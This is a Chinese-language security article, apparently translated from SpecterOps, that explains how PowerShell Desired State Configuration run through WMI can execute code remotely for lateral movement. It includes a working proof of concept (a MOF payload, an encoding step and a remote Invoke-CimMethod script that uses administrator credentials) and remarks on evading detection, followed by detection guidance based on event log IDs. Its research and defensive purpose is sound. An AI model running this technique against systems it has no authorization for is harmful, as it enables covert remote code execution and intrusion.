## 横向渗透技术简介

 **PowerShell期望状态配置（DSC）允许需要执行的资源直接使用WMI，在DSC
WMI类的帮助下，我们可以通过滥用内置脚本资源来实现PowerShell代码的远程执行。**

这样的横向渗透技术有如下几点好处：

1.PowerShell将在WMI服务-wmiprvse.exe环境下执行，从躲避检测的角度来说这是一个优势。

2.Payload的每一个组件都跟WMI有关系。

3.无需配置DSC服务。

## 横向渗透技术要求

1.ResourceTest方法必须在MSFT_DSCLocalConfigurationManager这个WMI类中，该类需位于root/Microsoft/Windows/DesiredStateConfiguration命名空间中。注意：攻击者还可以选择调用ResourceGet或ResourceSet方法。PowerShell
DSC是在PowerShell v4中引入的，所以这项技术并不适用于全部主机。

2.默认情况下，如果你要远程调用WMI方法，你需要拥有管理员凭证。WMI的安全是通过DCOM或WSMan安全设置来实现的，在建立远程连接时，WMI是通过目标命名空间的安全描述符实现的（root/Microsoft/Windows/DesiredStateConfiguration）。

## 攻击PoC

第一步就是准备Payload如何执行。你需要在目标主机上执行的PowerShell代码需要是MOF格式的，下面给出的是一份Payload样本：

    
    
    $MOFContents= @'
    
    instance of MSFT_ScriptResource as $MSFT_ScriptResource1ref
    
    {
    
           ResourceID ="[Script]ScriptExample";
    
           GetScript = "\"$(Get-Date): Iam being GET\" | Out-FileC:\\Windows\\Temp\\ScriptRun.txt -Append; return $True";
    
          TestScript = "\"$(Get-Date): Iam being TESTED\" | Out-File C:\\Windows\\Temp\\ScriptRun.txt -Append;return $True";
    
           SetScript = "\"$(Get-Date): Iam being SET\"   | Out-FileC:\\Windows\\Temp\\ScriptRun.txt -Append; return $True";
    
           SourceInfo = "::3::5::Script";
    
           ModuleName = "PsDesiredStateConfiguration";
    
           ModuleVersion = "1.0";
    
           ConfigurationName ="ScriptTest";
    
    };
    
    instance of OMI_ConfigurationDocument
    
    {
    
           Version="2.0.0";
    
           MinimumCompatibleVersion ="1.0.0";
    
           CompatibleVersionAdditionalProperties={"Omi_BaseResource:ConfigurationName"};
    
           Author="TestUser";
    
           GenerationDate="02/26/201807:09:21";
    
           GenerationHost="TestHost";
    
           Name="ScriptTest";
    
    };
    
    '@

这里，唯一需要修改的就是PowerShell
Payload。在我们的样例中，我们将调用ResourceTest方法，该方法会返回上面的“TestScript”属性。需要注意的是，特殊字符需要转义处理。

下一步就是把MOF转换成二进制形式，这种数据形式也是ResourceTest方法要求的：

    
    
    #Change this to false if you want to test the payload locally
    
    $ExecuteRemotely= $True
    
    $NormalizedMOFContents= [Text.Encoding]::UTF8.GetString([Text.Encoding]::ASCII.GetBytes($MOFContents))
    
    $NormalizedMOFBytes= [Text.Encoding]::UTF8.GetBytes($NormalizedMOFContents)
    
    $TotalSize= [BitConverter]::GetBytes($NormalizedMOFContents.Length + 4)
    
    if($ExecuteRemotely) {
    
           # Prepend the length of the payload
    
           [Byte[]] $MOFBytes = $TotalSize +$NormalizedMOFBytes
    
    }else {
    
           # If executing locally, you do notprepend the payload length
    
           [Byte[]] $MOFBytes = $NormalizedMOFBytes
    
    }

在上述样例中，如果你想在本地测试你的Payload，请不要在Byte数组中添加Payload长度。Payload正确编码之后，剩下的就是在目标主机上执行Payload了。

    
    
    #Specify the credentials of your target
    
    $Credential= Get-Credential -Credential TempUser
    
    $ComputerName= 'TargetHost'
    
    #Establish a remote WMI session with the target system
    
    $RemoteCIMSession= New-CimSession -ComputerName $ComputerName -Credential $Credential
    
    $LCMClass= Get-CimClass -Namespace root/Microsoft/Windows/DesiredStateConfiguration-ClassName MSFT_DSCLocalConfigurationManager -CimSession $RemoteCIMSession
    
    if($LCMClass -and $LCMClass.CimClassMethods['ResourceTest']) {
    
           # You may now proceed with lateralmovement
    
           $MethodArgs = @{
    
               ModuleName          ='PSDesiredStateConfiguration'
    
               ResourceType   = 'MSFT_ScriptResource'
    
               resourceProperty= $MOFBytes
    
           }
    
           $Arguments = @{
    
               Namespace  ='root/Microsoft/Windows/DesiredStateConfiguration'
    
               ClassName  = 'MSFT_DSCLocalConfigurationManager'
    
               MethodName= 'ResourceTest'
    
               Arguments  = $MethodArgs
    
               CimSession= $RemoteCIMSession
    
           }
    
           # Invoke the DSC script resource Testmethod
    
           # Successful execution will be indicatedby "InDesiredState" returning True and ReturnValue returning 0.
    
           Invoke-CimMethod @Arguments
    
    }else {
    
           Write-Warning 'The DSC lateral movementmethod is not available on the remote system.'
    
    }

在上面的例子中，大家请注意，我首先验证了远程类和方法的优先级。在使用WMI技术时，我们建议大家首先验证远程类和方法的优先级。

接下来，代码会将Payload下载到目标主机的磁盘中。如果你想要使用WMI来远程获取文件内容，你可以配合使用【[这项技术](https://twitter.com/mattifestation/status/899475316929736704)】。除此之外，我这里还使用了CIM
cmdlet，这个功能是在PowerShell v3中引入的，如果你需要适用v2版本的话，你还可以使用旧版本的WMI cmdlet。

## 终端检测&保护

幸运的是，我们可以通过检查事件日志来发现这种攻击活动，并进行及时检测。

### Microsoft-Windows-PowerShell/Operational事件日志

    
    
    EventID: 53504

“PowerShell Named Pipe IPC”事件表明PowerShell
AppDomain已启用。当DSC执行脚本资源时，这个事件会自动捕捉“DscPsPluginWkr_AppDomain”。而AppDomain对于一次DSC执行来说是唯一的，下面是一个事件样例：

    
    
    Windows PowerShell has started an IPC listening thread on process: 6480 in AppDomain:DscPsPluginWkr_AppDomain.

### “Windows PowerShell”事件日志

    
    
    EventID: 400

在正常的PowerShell日志中，事件ID
400表明一个新的PowerShell主机进程被创建。当DSC脚本资源执行时，它会生成一个唯一的事件日志条目，并对其进行签名。下面是一个样例（引擎状态从NONE转换成了Available）：

    
    
    Details:
    
     NewEngineState=Available
    
     PreviousEngineState=None
    
     SequenceNumber=13
    
     HostName=Default Host
    
     HostVersion=5.1.17134.81
    
     HostId=19cfc50e-8894-4cd5-b0a9-09edd7785b7d
    
     HostApplication=C:\Windows\system32\wbem\wmiprvse.exe
    
     EngineVersion=5.1.17134.81
    
     RunspaceId=12ebba81-9b73-4b1e-975d-e2c16da30906
    
     PipelineId=
    
     CommandName=
    
     CommandType=
    
     ScriptName=
    
     CommandPath=
    
     CommandLine=

### Microsoft-Windows-DSC/Operational事件日志

    
    
    EventID: 4102

当一个DSC资源被发送至目标主机之后，系统会响应这个事件。如果目标主机存在于一个计算机域中，那么系统会返回执行这个DSC资源的用户SID以及源主机信息。下面是事件样本信息：

    
    
    Job{893F64B5-ABBF-11E8-B005-D336977413FC} : 
    
    OperationInvoke-DscResource started by user sidS-1-5-21-3160353621-618008412-2361186285-1001 from computer NULL.

## 演示视频

在下面这个视频中，我们将给大家演示本文所介绍的渗透技术：

DEMO代码：【[点我获取](https://gist.github.com/mattifestation/89bfacc2435bd9d2f82a8205ea984d1d)】

*参考来源：[specterops](https://posts.specterops.io/abusing-powershell-desired-state-configuration-for-lateral-movement-ca42ddbe6f06)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM

